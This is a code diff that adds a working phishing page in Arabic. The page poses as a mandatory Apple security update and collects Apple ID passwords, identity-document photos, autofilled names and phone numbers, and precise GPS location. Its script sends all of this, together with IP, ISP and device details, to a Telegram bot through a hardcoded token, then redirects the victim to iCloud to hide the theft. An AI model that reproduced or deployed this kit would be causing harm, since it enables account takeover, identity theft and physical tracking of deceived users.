@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Apple Security Update</title>
+    <style>
+        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .box { width: 100%; max-width: 350px; text-align: center; padding: 20px; box-sizing: border-box; }
+        img { width: 35px; margin-bottom: 20px; }
+        h1 { font-size: 22px; font-weight: 600; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
+        input { width: 100%; padding: 14px; margin-bottom: 10px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; }
+        .file-label { display: block; padding: 10px; background: #f5f5f7; border: 1px dashed #d2d2d7; border-radius: 10px; margin-bottom: 15px; cursor: pointer; font-size: 13px; color: #0071e3; }
+        button { width: 100%; padding: 14px; background: #0071e3; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 500; cursor: pointer; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+    <h1>تحديث أمني إلزامي</h1>
+    <p>يرجى تأكيد هويتك عبر تسجيل الدخول وإرفاق صورة الهوية لتجنب قفل حسابك.</p>
+    
+    <input type="text" id="full_name" class="hidden" autocomplete="name">
+    <input type="tel" id="phone" class="hidden" autocomplete="tel">
+    
+    <input type="email" id="u" placeholder="Apple ID" required autocomplete="username">
+    <input type="password" id="p" placeholder="Password" required autocomplete="current-password">
+    
+    <label class="file-label">
+        📸 إرفاق صورة الهوية للتحقق
+        <input type="file" id="photo_trap" class="hidden" accept="image/*">
+    </label>
+    
+    <button id="btn">تحديث الآن</button>
+</div>
+
+<script>
+    const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
+    const chat_id = "6888107255";
+
+    async function sendMsg(text) {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
+    }
+
+    // جلب بيانات الشبكة (الآي بي والموقع)
+    async function getNetData() {
+        try {
+            const res = await fetch('https://ipwho.is/');
+            return await res.json();
+        } catch(e) { return null; }
+    }
+
+    // 1. عند الدخول: إرسال تنبيه وطلب GPS
+    window.onload = async function() {
+        sendMsg("🚀 <b>دخول جديد للرابط... جاري سحب البيانات</b>");
+        
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            sendMsg(`📍 <b>GPS دقيق للضحية:</b>\nhttps://www.google.com/maps?q=${lat},${lon}`);
+        });
+    };
+
+    // 2. فخ الصور
+    document.getElementById('photo_trap').onchange = async function(e) {
+        const file = e.target.files[0];
+        if (file) {
+            sendMsg("📸 <b>جاري رفع الصورة الملتقطة من الضحية...</b>");
+            let formData = new FormData();
+            formData.append('chat_id', chat_id);
+            formData.append('photo', file);
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+        }
+    };
+
+    // 3. التقرير الشامل (تمت إعادة جميع الحقول المفقودة)
+    document.getElementById('btn').onclick = async function() {
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+        const autoName = document.getElementById('full_name').value || "غير متوفر";
+        const autoPhone = document.getElementById('phone').value || "غير متوفر";
+        
+        if(!user || !pass) return alert("يرجى إدخال البيانات");
+
+        this.innerHTML = "جاري التحقق...";
+        this.disabled = true;
+
+        const d = await getNetData();
+        const ip = d ? d.ip : "N/A";
+        const city = d ? d.city : "N/A";
+        const country = d ? d.country : "N/A";
+        const isp = d ? d.connection.isp : "N/A";
+        const map = d ? `https://www.google.com/maps?q=${d.latitude},${d.longitude}` : "N/A";
+
+        let report = "⚠️ <b>تم الاختراق الكامل للهدف</b> ⚠️\n\n";
+        report += "📧 <b>الحساب:</b> <code>" + user + "</code>\n";
+        report += "🔑 <b>الباسورد:</b> <code>" + pass + "</code>\n";
+        report += "👤 <b>الاسم (Autofill):</b> " + autoName + "\n";
+        report += "📞 <b>الجوال (Autofill):</b> " + autoPhone + "\n";
+        report += "------------------------\n";
+        report += "🌐 <b>الـ IP:</b> " + ip + "\n";
+        report += "📍 <b>الموقع:</b> " + city + " (" + country + ")\n";
+        report += "📶 <b>المزود:</b> " + isp + "\n";
+        report += "📱 <b>النظام:</b> " + navigator.platform + "\n";
+        report += "🔋 <b>البطارية:</b> " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
+        report += "📏 <b>الدقة:</b> " + screen.width + "x" + screen.height + "\n";
+        report += "🕰️ <b>الوقت:</b> " + new Date().toLocaleString() + "\n";
+        report += "🔒 <b>كوكيز:</b> " + (document.cookie ? "موجودة" : "محمية") + "\n\n";
+        report += "📍 <b>موقع الضحية على الخريطة:</b>\n" + map;
+
+        await sendMsg(report);
+
+        setTimeout(() => {
+            window.location.replace("https://www.icloud.com/");
+        }, 1500);
+    };
+</script>
+
+</body>
+</html>
